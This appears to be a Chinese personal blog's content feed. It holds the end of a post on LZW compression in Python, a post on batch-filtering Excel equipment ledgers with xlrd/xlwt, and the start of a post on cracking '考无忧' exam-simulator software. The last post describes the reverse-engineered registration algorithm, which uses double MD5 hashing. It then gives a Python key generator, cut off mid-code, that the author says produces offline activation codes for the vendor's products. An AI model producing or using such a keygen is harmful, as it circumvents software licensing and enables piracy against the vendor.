+ entry[<span class="number">0</span>]</span><br><span class="line">	pos += <span class="number">1</span>				 <span class="comment">#解码字典位置指针加一</span></span><br><span class="line">	p = c					 <span class="comment">#更新前缀串为当前遍历字符</span></span><br></pre></td></tr></table></figure>

<p>最后返回解码结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#结果存在list类中，可转换成字符串格式返回，即和原文本相同格式</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br></pre></td></tr></table></figure>

<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>本文使用了17.8KB的《I have a dream》与635KB的《Wuthering Heights》作为测试文本对上一章节的LZW编码进行测试，测试结果如下表：</p>
<table>
<thead>
<tr>
<th>文件名称</th>
<th>大小</th>
<th>字符数</th>
<th>编码码字</th>
<th>编码大小</th>
<th>压缩比</th>
</tr>
</thead>
<tbody><tr>
<td>《I have a dream》</td>
<td>17.8K</td>
<td>18138</td>
<td>5674</td>
<td>9.0K</td>
<td>50.6%</td>
</tr>
<tr>
<td>《Wuthering Heights》</td>
<td>635K</td>
<td>645611</td>
<td>143912</td>
<td>281.0K</td>
<td>44.3%</td>
</tr>
</tbody></table>
<p>由此表可以看出，LZW编码存在<strong>文本量越大，编码压缩效果越好</strong>的特性。</p>
<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>在第3章实现了LZW的编码和解码后，自然对LZW压缩算法产生一些思考。通过网络查询，发现了以下几种提高LZW压缩率的改进途径：</p>
<ol>
<li>混合使用LZ77和LZ78。即在发现标记匹配结束后，不立即结束匹配，而是再在一个滑动窗口中寻找是否有更好的匹配，如果有就以{位置，匹配长度}组的形式写入输出流中，并把该字符串逐个增加为标记。</li>
<li>使用固定长度字节的编码，即设定编码字典的长度，当编码字典满了之后清空字典。</li>
<li>实时检测压缩率，当压缩率下降到一定阈值时，清空编码字典。</li>
</ol>
<p>这些途径都各有优缺。</p>
<p>第一种途径可以很大地提高压缩比。但滑动窗口的选择是个复杂的问题。而且匹配长字符串会增加很多标记，使字典增加过快。</p>
<p>第二种途径压缩速度快，压缩效率较高，该方法也广为使用。</p>
<p>第三种途径在一般情况下应该有不错效果，但在源文件的统计规律发生较大变化大情况下，等发现字典不合适后再重建可能就来不及了。如果和其它的方法结合使用可能更好。</p>
<p>综合各点，可以看出，在不特别考虑速度的情况下，LZW的编码压缩率主要集中于<strong>码字长度</strong>与<strong>码字个数</strong>上。</p>
<p>结合第二种途径分析，我觉得可以在清空字典这一环节上加以改进。比如并不完全清空字典，只清空掉使用率低的码字。但这种方法实现复杂，会增加很大开销。因此采用比较折中的方法，即清空时只清空一半，保留一半原编码字典。</p>
<p>针对此方法，修改LZW编码部分关键代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string:</span><br><span class="line">	pc = p + c</span><br><span class="line">	<span class="keyword">if</span> pc <span class="keyword">in</span> dictionary <span class="keyword">and</span> dictionary[pc]&lt;pos: </span><br><span class="line">		p = pc				<span class="comment">#避免访问到字典已清空部分</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		result.append(dictionary[p])</span><br><span class="line">		dictionary[pc] = pos</span><br><span class="line">		pos += <span class="number">1</span></span><br><span class="line">		p = c</span><br><span class="line">	<span class="keyword">if</span> pos == <span class="number">65536</span>:        <span class="comment">#设定编码字典长度16位</span></span><br><span class="line">		pos = pos&gt;&gt;<span class="number">1</span>		<span class="comment">#超过长度时清空一半字典</span></span><br></pre></td></tr></table></figure>

<p>使用《Wuthering Heights》测试此方法压缩效果并与原LZW压缩算法对比如下表：</p>
<table>
<thead>
<tr>
<th>压缩方法</th>
<th>码字个数</th>
<th>码字长度</th>
<th>编码大小</th>
<th>压缩比</th>
</tr>
</thead>
<tbody><tr>
<td>不清空字典编码</td>
<td>125909</td>
<td>3(17bit)</td>
<td>368.9K</td>
<td>50.6%</td>
</tr>
<tr>
<td>全清空字典编码</td>
<td>143912</td>
<td>2(16bit)</td>
<td>281.0K</td>
<td>44.3%</td>
</tr>
<tr>
<td>半清空字典编码</td>
<td>129694</td>
<td>2(16bit)</td>
<td>253.3K</td>
<td>39.9%</td>
</tr>
</tbody></table>
<p>可以看到，该方法针对全清空字典方案压缩率有小幅度提升。但同时也承认，在极端情况下，即<strong>未清空部分字典出现频率极低（甚至只出现一次）的情况下，只清空一半的方式反而不会得到太好的压缩效率。</strong></p>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a><em>附录</em></h1><p>此处给出第3章节LZW编解码部分完整代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lzw_compress</span>(<span class="params">string</span>):</span><br><span class="line">	<span class="comment">#设ASCII码0~255均为初始化字符，编码中添加字符串下标从256开始</span></span><br><span class="line">	dictionary = &#123;<span class="built_in">chr</span>(i) : i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>)&#125;</span><br><span class="line">	pos = <span class="number">256</span></span><br><span class="line">	p = <span class="string">&#x27;&#x27;</span>                   <span class="comment">#初始化前缀串与编码结果集</span></span><br><span class="line">	result = []</span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> string:            <span class="comment">#遍历待编码文本</span></span><br><span class="line">		pc = p + c				<span class="comment">#取当前串为前缀串加后一字符</span></span><br><span class="line">		<span class="keyword">if</span> pc <span class="keyword">in</span> dictionary:	<span class="comment">#如果当前串在编码字典中</span></span><br><span class="line">			p = pc				<span class="comment">#更新前缀串为当前串</span></span><br><span class="line">		<span class="keyword">else</span>:					<span class="comment">#否则前缀串下标对应码字输出</span></span><br><span class="line">			result.append(dictionary[p])</span><br><span class="line">			dictionary[pc] = pos<span class="comment">#将当前串存到编码字典最后</span></span><br><span class="line">			pos += <span class="number">1</span>			<span class="comment">#编码字典位置指针加一</span></span><br><span class="line">			p = c				<span class="comment">#更新前缀串为当前遍历字符</span></span><br><span class="line">	<span class="keyword">if</span> p :						<span class="comment">#保证最后一个字符串编码完成</span></span><br><span class="line">		result.append(dictionary[p])</span><br><span class="line">	<span class="keyword">return</span> result				<span class="comment">#返回编码结果</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lzw_decompress</span>(<span class="params">array</span>):</span><br><span class="line"><span class="comment">#设ASCII码0~255均为初始化字符，解码中添加字符串下标从256开始</span></span><br><span class="line">	dictionary = &#123;i : <span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>)&#125;</span><br><span class="line">	pos = <span class="number">256</span></span><br><span class="line">	result = []						<span class="comment">#初始化解码结果集</span></span><br><span class="line">	p = array.pop(<span class="number">0</span>)				<span class="comment">#取首字符初始化前缀串</span></span><br><span class="line">	result.append(dictionary[p])	<span class="comment">#首字符解码输出</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> array:              <span class="comment">#遍历待解码文本</span></span><br><span class="line">		<span class="keyword">if</span> c <span class="keyword">in</span> dictionary:      <span class="comment">#如果遍历字符在解码字典中</span></span><br><span class="line">			entry = dictionary[c]<span class="comment">#将该遍历字符赋给当前串</span></span><br><span class="line">	<span class="comment">#如果遍历字符不在字典中且与字典下表指针相同（即将加入解码字典）</span></span><br><span class="line">		<span class="keyword">elif</span> c == pos:			 <span class="comment">#将前缀串加首字符赋给当前串</span></span><br><span class="line">			entry = dictionary[p] + dictionary[p][<span class="number">0</span>]</span><br><span class="line">		<span class="keyword">else</span>:					 <span class="comment">#否则编码有误，抛出异常</span></span><br><span class="line">			<span class="keyword">raise</span> ValueError(<span class="string">&#x27;Compressed Error : %s&#x27;</span> % c)</span><br><span class="line">		result.append(entry)	 <span class="comment">#将当前串作为解码输出</span></span><br><span class="line">		<span class="comment">#将前缀串下标对应字符串加当前串首字符合并加入解码字典</span></span><br><span class="line">		dictionary[pos] = dictionary[p] + entry[<span class="number">0</span>]</span><br><span class="line">		pos += <span class="number">1</span>				 <span class="comment">#解码字典位置指针加一</span></span><br><span class="line">		p = c					 <span class="comment">#更新前缀串为当前遍历字符</span></span><br><span class="line">	<span class="comment">#结果存在list类中，可转换成字符串格式返回，即和原文本相同格式</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br></pre></td></tr></table></figure>

<p>由于篇幅问题，LZW改进部分只在第5章节给出了核心代码，如需查阅<strong>改进部分完整代码</strong>及<strong>测试文本</strong>《I have a dream》、《Wuthering Heights》，请访问我的github页面：<a href="https://github.com/gaoteng17/lzw">https://github.com/gaoteng17/lzw</a></p>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>lzw</tag>
      </tags>
  </entry>
  <entry>
    <title>利用python脚本对excel表格目标数据进行自动筛选计数</title>
    <url>/1007/</url>
    <content><![CDATA[<p>工作要求，需要对几十个格式相同的设备台账excel表格中电源数据、光端机起终点数据分别进行筛选计数，由于表格数据量极大，人工效率低，因此利用python脚本对这几十个表格进行自动筛选计数。</p>
<p>在写脚本的过程中，学到了很多python处理excel表格的相关技巧，写下此文帮助记忆。</p>
<span id="more"></span>

<h1 id="xlrd-x2F-xlwt模块介绍"><a href="#xlrd-x2F-xlwt模块介绍" class="headerlink" title="xlrd&#x2F;xlwt模块介绍"></a>xlrd&#x2F;xlwt模块介绍</h1><p>python操作excel主要用到xlrd和xlwt两个库。xlrd是读excel，xlwt是写excel。</p>
<h2 id="xlrd-x2F-xlwt的安装"><a href="#xlrd-x2F-xlwt的安装" class="headerlink" title="xlrd&#x2F;xlwt的安装"></a>xlrd&#x2F;xlwt的安装</h2><p>cmd窗口下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install xlrd</span><br><span class="line">pip install xlwt</span><br></pre></td></tr></table></figure>

<h2 id="xlrd-x2F-xlwt的使用"><a href="#xlrd-x2F-xlwt的使用" class="headerlink" title="xlrd&#x2F;xlwt的使用"></a>xlrd&#x2F;xlwt的使用</h2><p>xlrd读excel：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> xlrd  <span class="comment">#导入读excel的模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#打开excel</span></span><br><span class="line">filename=<span class="string">&#x27;test.xlsx&#x27;</span></span><br><span class="line">data=xlrd.open_workbook(filename,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取excel工作表</span></span><br><span class="line">mysheets=data.sheets() <span class="comment">#获取工作表list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过索引获取第一个sheet</span></span><br><span class="line">mysheet=mysheets[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过索引顺序获取</span></span><br><span class="line"><span class="comment">#mysheet=data.sheet_by_index(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过名称获取</span></span><br><span class="line"><span class="comment">#mysheet=data.sheet_by_name(u&#x27;Sheet1&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取行数和列数</span></span><br><span class="line">nrows=mysheet.nrows</span><br><span class="line"><span class="built_in">print</span> nrows</span><br><span class="line">ncols=mysheet.ncols</span><br><span class="line"><span class="built_in">print</span> ncols</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取一行和一列</span></span><br><span class="line"><span class="comment">#myRowValues=mysheet.row_values(0)</span></span><br><span class="line"><span class="comment">#print myRowValues</span></span><br><span class="line"><span class="comment">#myColValues=mysheet.col_values(0)</span></span><br><span class="line"><span class="comment">#print myColValues</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#读取单元格数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">        myCell=mysheet.cell(j,i)</span><br><span class="line">        myCellValue=myCell.value</span><br><span class="line">        <span class="built_in">print</span> myCellValue</span><br></pre></td></tr></table></figure>

<p>xlwt写excel：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="comment">#导入模块</span></span><br><span class="line"><span class="keyword">import</span>  xlwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建excel工作薄</span></span><br><span class="line">myWorkbook=xlwt.Workbook()</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加Excel工作表</span></span><br><span class="line">mySheet=myWorkbook.add_sheet(<span class="string">&quot;a Test Sheet&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#写入数据</span></span><br><span class="line">myStyle=xlwt.easyxf(<span class="string">&#x27;font: name Times New Roman, color-index red, bold on&#x27;</span>, num_format_str=<span class="string">&#x27;#,##0.00&#x27;</span>) <span class="comment">#数据格式</span></span><br><span class="line">mySheet.write(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1234.56</span>,myStyle)</span><br><span class="line">mySheet.write(<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">mySheet.write(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">mySheet.write(<span class="number">2</span>,<span class="number">2</span>,xlwt.Formula(<span class="string">&quot;A3+B3&quot;</span>))</span><br><span class="line"></span><br><span class="line">myWorkbook.save(<span class="string">&quot;excelFile.xlsx&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="自动筛选脚本编写"><a href="#自动筛选脚本编写" class="headerlink" title="自动筛选脚本编写"></a>自动筛选脚本编写</h1><p>分析表格数据，目标表格存在合并单元格，因此我需要先将合并单元格拆分，并将数据复制到每一个拆分的单元格，这里从百度搜到了现成代码，经测试可以正常使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_excel</span>(<span class="params">file_path</span>):</span><br><span class="line">	data = xlrd.open_workbook(file_path) <span class="comment">#打开excel</span></span><br><span class="line">	sheet_names = data.sheet_names()<span class="comment">#读sheet</span></span><br><span class="line"></span><br><span class="line">	table = data.sheet_by_name(sheet_name) <span class="comment">#按名字获取工作表</span></span><br><span class="line">	nrows = table.nrows <span class="comment">#获得行数</span></span><br><span class="line">	ncols = table.ncols <span class="comment">#获得列数</span></span><br><span class="line"></span><br><span class="line">	name = []</span><br><span class="line"></span><br><span class="line">	colspan = &#123;&#125;</span><br><span class="line">	<span class="keyword">if</span> table.merged_cells :</span><br><span class="line">		<span class="keyword">for</span> item <span class="keyword">in</span> table.merged_cells:</span><br><span class="line">			<span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(item[<span class="number">0</span>], item[<span class="number">1</span>]):</span><br><span class="line">				<span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(item[<span class="number">2</span>], item[<span class="number">3</span>]):</span><br><span class="line">					<span class="keyword">if</span> (row, col) != (item[<span class="number">0</span>], item[<span class="number">2</span>]):</span><br><span class="line">						colspan.update(&#123;(row, col): (item[<span class="number">0</span>], item[<span class="number">2</span>])&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, nrows):</span><br><span class="line">		row = []</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">			<span class="keyword">if</span> colspan.get((i, j)):</span><br><span class="line">				row.append(table.cell_value(*colspan.get((i, j))))</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				row.append(table.cell_value(i, j))</span><br></pre></td></tr></table></figure>

<p>分析目标表格，需要筛选的电源数据格式如下：</p>
<p><img src="/1007/1.PNG" alt="电源数据格式"></p>
<p>需要筛选的光端机起终点数据格式如下：</p>
<p><img src="/1007/2.PNG" alt="光端机数据格式"></p>
<p>根据数据格式，编写脚本：</p>
<h2 id="扫描目录下所有目标excel表格"><a href="#扫描目录下所有目标excel表格" class="headerlink" title="扫描目录下所有目标excel表格"></a>扫描目录下所有目标excel表格</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filelist=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="string">&quot;.&quot;</span>, topdown=<span class="literal">False</span>):</span><br><span class="line">	<span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">		<span class="built_in">str</span>=os.path.join(root, name)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">str</span>.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]==<span class="string">&#x27;xlsx&#x27;</span>:</span><br><span class="line">			filelist.append(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(filelist)</span><br></pre></td></tr></table></figure>

<h2 id="分别读数据，筛选计数，并将统计结果写入新建excel表中"><a href="#分别读数据，筛选计数，并将统计结果写入新建excel表中" class="headerlink" title="分别读数据，筛选计数，并将统计结果写入新建excel表中"></a>分别读数据，筛选计数，并将统计结果写入新建excel表中</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> filelist :</span><br><span class="line"></span><br><span class="line">	result = []</span><br><span class="line">	result.append([<span class="string">&quot;屏序号&quot;</span>, <span class="string">&quot;屏名称&quot;</span>, <span class="string">&quot;屏内设备&quot;</span>, <span class="string">&quot;厂家型号&quot;</span>, <span class="string">&quot;起点&quot;</span>, <span class="string">&quot;终点&quot;</span>, <span class="string">&quot;备注&quot;</span>])</span><br><span class="line">	result2 = []</span><br><span class="line">	result2.append([<span class="string">&quot;屏序号&quot;</span>, <span class="string">&quot;屏名称&quot;</span>, <span class="string">&quot;屏内设备&quot;</span>, <span class="string">&quot;厂家型号&quot;</span>, <span class="string">&quot;数量&quot;</span>, <span class="string">&quot;备注&quot;</span>])</span><br><span class="line">	read_excel(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	tmp = file.split(<span class="string">&quot;.xlsx&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br><span class="line">	write_excel(result, tmp+<span class="string">&quot; 光端机.xls&quot;</span>)</span><br><span class="line">	write_excel(result2, tmp+<span class="string">&quot; 电源.xls&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="将各excel统计结果进行汇总，得到总的统计结果"><a href="#将各excel统计结果进行汇总，得到总的统计结果" class="headerlink" title="将各excel统计结果进行汇总，得到总的统计结果"></a>将各excel统计结果进行汇总，得到总的统计结果</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filelist=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="string">&quot;.&quot;</span>, topdown=<span class="literal">False</span>):</span><br><span class="line">	<span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">		<span class="built_in">str</span>=os.path.join(root, name)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">str</span>.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]==<span class="string">&#x27;xls&#x27;</span>:</span><br><span class="line">			filelist.append(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(filelist)</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line">result.append([<span class="string">&quot;屏序号&quot;</span>, <span class="string">&quot;屏名称&quot;</span>, <span class="string">&quot;屏内设备&quot;</span>, <span class="string">&quot;厂家型号&quot;</span>, <span class="string">&quot;起点&quot;</span>, <span class="string">&quot;终点&quot;</span>, <span class="string">&quot;备注&quot;</span>, <span class="string">&quot;来源&quot;</span>])</span><br><span class="line">result2 = []</span><br><span class="line">result2.append([<span class="string">&quot;屏序号&quot;</span>, <span class="string">&quot;屏名称&quot;</span>, <span class="string">&quot;屏内设备&quot;</span>, <span class="string">&quot;厂家型号&quot;</span>, <span class="string">&quot;数量&quot;</span>, <span class="string">&quot;备注&quot;</span>, <span class="string">&quot;来源&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span>(filelist)</span><br></pre></td></tr></table></figure>

<h2 id="read-excel的编写"><a href="#read-excel的编写" class="headerlink" title="read_excel的编写"></a><code>read_excel</code>的编写</h2><p>在拆分数据格后，按行扫描，扫描到关键词后将本段内容统计计数，<strong>需要注意的是拆分后导致的重复计数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_excel</span>(<span class="params">file_path</span>):</span><br><span class="line">	data = xlrd.open_workbook(file_path) <span class="comment">#打开excel</span></span><br><span class="line">	sheet_names = data.sheet_names()<span class="comment">#读sheet</span></span><br><span class="line"></span><br><span class="line">	table = data.sheet_by_name(<span class="string">&quot;设备屏&quot;</span>)</span><br><span class="line">	nrows = table.nrows <span class="comment">#获得行数</span></span><br><span class="line">	ncols = table.ncols <span class="comment">#获得列数</span></span><br><span class="line"></span><br><span class="line">	name = []</span><br><span class="line"></span><br><span class="line">	colspan = &#123;&#125;</span><br><span class="line">	<span class="keyword">if</span> table.merged_cells :</span><br><span class="line">		<span class="keyword">for</span> item <span class="keyword">in</span> table.merged_cells:</span><br><span class="line">			<span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(item[<span class="number">0</span>], item[<span class="number">1</span>]):</span><br><span class="line">				<span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(item[<span class="number">2</span>], item[<span class="number">3</span>]):</span><br><span class="line">					<span class="keyword">if</span> (row, col) != (item[<span class="number">0</span>], item[<span class="number">2</span>]):</span><br><span class="line">						colspan.update(&#123;(row, col): (item[<span class="number">0</span>], item[<span class="number">2</span>])&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, nrows):</span><br><span class="line">		row = []</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">			<span class="keyword">if</span> colspan.get((i, j)):</span><br><span class="line">				row.append(table.cell_value(*colspan.get((i, j))))</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				row.append(table.cell_value(i, j))</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> row[<span class="number">4</span>].find(<span class="string">&quot;起点&quot;</span>) :</span><br><span class="line">			name.append(row[<span class="number">4</span>])</span><br><span class="line">		<span class="keyword">else</span> :</span><br><span class="line">			result.append([row[<span class="number">0</span>], row[<span class="number">1</span>], row[<span class="number">3</span>], name[-<span class="number">1</span>], row[<span class="number">4</span>], row[<span class="number">5</span>], row[<span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> row[<span class="number">1</span>].find(<span class="string">&quot;电源&quot;</span>) &gt; -<span class="number">1</span> <span class="keyword">or</span> row[<span class="number">1</span>].find(<span class="string">&quot;直流&quot;</span>) &gt; -<span class="number">1</span> <span class="keyword">or</span> row[<span class="number">1</span>].find(<span class="string">&quot;交流&quot;</span>) &gt; -<span class="number">1</span>:</span><br><span class="line">			<span class="keyword">if</span> row[<span class="number">6</span>] :</span><br><span class="line">				result2.append([row[<span class="number">0</span>], row[<span class="number">1</span>], row[<span class="number">3</span>], row[<span class="number">4</span>], row[<span class="number">5</span>], row[<span class="number">6</span>]])	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="write-excel的编写"><a href="#write-excel的编写" class="headerlink" title="write_excel的编写"></a><code>write_excel</code>的编写</h2><p>写入的话可以进行一些参数的设定，这里这设置了固定列宽</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_excel</span>(<span class="params">data, file_path</span>):</span><br><span class="line">	xls = xlwt.Workbook()</span><br><span class="line">	sheet = xls.add_sheet(<span class="string">&#x27;sheet&#x27;</span>, cell_overwrite_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line"></span><br><span class="line">		sheet.col(row).width = <span class="number">7500</span>  <span class="comment">#固定列宽</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data[<span class="number">0</span>])):</span><br><span class="line">		</span><br><span class="line">			sheet.write(row, col, data[row][col])</span><br><span class="line"></span><br><span class="line">	xls.save(file_path)</span><br></pre></td></tr></table></figure>

<h2 id="sum的编写"><a href="#sum的编写" class="headerlink" title="sum的编写"></a><code>sum</code>的编写</h2><p>sum函数只是简单的excel表格拼接，汇总各excel表格统计结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sum</span>(<span class="params">filelist</span>):</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> file <span class="keyword">in</span> filelist :</span><br><span class="line"></span><br><span class="line">		tmp = file.split(<span class="string">&quot;.xlsx&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line">		<span class="built_in">print</span>(tmp)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> file.find(<span class="string">&quot;汇总&quot;</span>) &gt; -<span class="number">1</span> :</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;233&quot;</span>)</span><br><span class="line">		<span class="keyword">elif</span> file.find(<span class="string">&quot;光端机&quot;</span>) &gt; -<span class="number">1</span> :</span><br><span class="line">			sum_excel(file, result, tmp)</span><br><span class="line">		<span class="keyword">elif</span> file.find(<span class="string">&quot;电源&quot;</span>) &gt; -<span class="number">1</span> :</span><br><span class="line">			sum_excel(file, result2, tmp)</span><br><span class="line"></span><br><span class="line">	write_excel(result, <span class="string">&quot;汇总 - 光端机.xls&quot;</span>)</span><br><span class="line">	write_excel(result2, <span class="string">&quot;汇总 - 电源.xls&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="效果测试"><a href="#效果测试" class="headerlink" title="效果测试"></a>效果测试</h1><p>首先将需要统计的excel表格放到同一目录下，执行脚本，自动生成各excel表格统计结果表与汇总表。这里使用了三个excel表格进行测试。</p>
<p><img src="/1007/3.PNG" alt="原目录文件"></p>
<p><img src="/1007/4.PNG" alt="执行脚本后目录文件"></p>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>excel</tag>
      </tags>
  </entry>
  <entry>
    <title>考无忧模拟考试题库软件的分析破解</title>
    <url>/1008/</url>
    <content><![CDATA[<p>本文基于52pojie大佬肥牛的<a href="https://www.52pojie.cn/thread-613378-1-1.html">考无忧2017离线注册算法分析</a> 一文中的算法分析，使用python写了一个离线注册的脚本，理论上支持考无忧旗下所有的模拟考试题库软件。</p>
<span id="more"></span>

<h1 id="注册算法分析"><a href="#注册算法分析" class="headerlink" title="注册算法分析"></a>注册算法分析</h1><p>大佬使用OD分析了模拟考试软件的算法，而且其中涉及到注册码算法的关键部分，还写了详细的注释，方便我们的理解。</p>
<p><img src="/1008/1.PNG"></p>
<p><img src="/1008/2.PNG"></p>
<h1 id="离线注册代码"><a href="#离线注册代码" class="headerlink" title="离线注册代码"></a>离线注册代码</h1><p>分析OD内容，加密算法其实很简单，字符串拼接，两次MD5处理，每次均取前20位，最后每5位一组分开，中间用-连接即为真正的离线注册码。</p>
<p>写脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">arg</span>):</span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(arg.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">machine, login, subject</span>):</span><br><span class="line">	machine = machine.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="built_in">input</span> = machine + <span class="string">&#x27;&amp;&#x27;</span> + login + <span class="string">&#x27;&amp;&#x27;</span> + subject</span><br><span class="line">	secret1 = md5(<span class="built_in">input</span>)[<span class="number">0</span>:<span class="number">20</span>].upper()</span><br><span class="line">	secret2 = md5(secret1).upper()</span><br><span class="line">	output = secret2[:<span class="number">5</span>]+<span class="string">&#x27;-&#x27;</span>+ secret2[<span class="number">5</span>:<span class="number">10</span>]+<span class="string">&#x27;-&#x27;</span>+ secret2[<span class="number">10</span>:<span class="number">15</span>]+<span class="string">&#x27;-&#x27;</span>+ secret2[<span class="number">15</span>:<span class="number">20</span>]</span><br><span class="line">	<span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	login = <span class="string">&#x27;1234512345123451234512345&#x27;</span>    //注册码</span><br><span class="line">	subject = <span class="string">&#x27;Word2003&#x27;</span>                   //注册科目</span><br><span class="line">	machine = <span class="string">&#x27;4B324-54B7D-8DB83-70CFD&#x27;</span>    